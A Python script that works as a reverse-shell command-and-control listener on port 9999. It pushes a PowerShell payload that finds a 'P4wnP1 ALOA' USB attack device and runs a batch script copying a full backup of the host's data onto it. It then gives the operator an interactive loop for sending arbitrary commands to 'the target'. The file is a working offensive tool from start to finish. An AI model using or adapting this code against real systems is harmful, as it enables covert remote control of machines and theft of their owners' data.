import socket, sys, time

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)

    #Send command
    command = """$drivefound=$false
                     while (-not $drivefound)
                     {
                         try
                         {
                             $drive=Get-Volume -FileSystemLabel \"P4wnP1 ALOA\" -ErrorAction Stop
                         }
                         catch 
                         {
                             \"Waiting for P4wnP1 drive\"
                             sleep 1
                             continue
                         } 
                         $dl=($drive.DriveLetter | Out-String)[0] +\":\"
                         $drivefound=$true
                     }

                     $roboLoaderFolder = $dl+\"\\\\RoboLoader\"
                     if (Test-Path -Path $roboLoaderFolder ) {
                         echo \"RoboLoader found\"
                     } else {
                         echo \"RoboLoader not found\"
                         return
                     }

                     $hname=hostname
                     $date=Get-Date -Format \"yyyyMMdd\"
                     $env:backupFolderName=$hname+\"_\"+$date
                     $json = Get-Content $roboLoaderFolder\"\\\\robotEnv.json\" | ConvertFrom-Json

                     $backupFolder = $json.config.robotsBaseFolder
                     $backupFolder = $backupFolder.replace(\"%~dp0\\..\",$dl)
                     $backupFolder = $backupFolder.replace(\"%backupFolderName%\",$env:backupFolderName)
                     $backupFolderNr = 0
                     while ($true)
                     {
                         if (Test-Path -Path $backupFolder\"_\"$backupFolderNr) {
                             $backupFolderNr = $backupFolderNr + 1
                         } else {
                             $env:backupFolderName=$env:backupFolderName+\"_\"+$backupFolderNr
                             break
                         }
                     }

                     Start-Process -FilePath $dl\"\\\\RoboLoader\\\\_downloadCompleteBackup.bat\" -ArgumentList \"CONT\" -Wait
                     echo doneDeal"""
    command += "\n"
    conn.send(command.encode())
    time.sleep(20)
	
    #Receive data from the target and get user input
    ans = conn.recv(1024).decode()
    sys.stdout.write(ans)

    while True:
        #Send command
        command = input("Give input:")
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
	
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        
        #Remove the output of the "input()" function
        #sys.stdout.write("\033[A" + ans.split("\n")[-1])

listen("0.0.0.0",9999)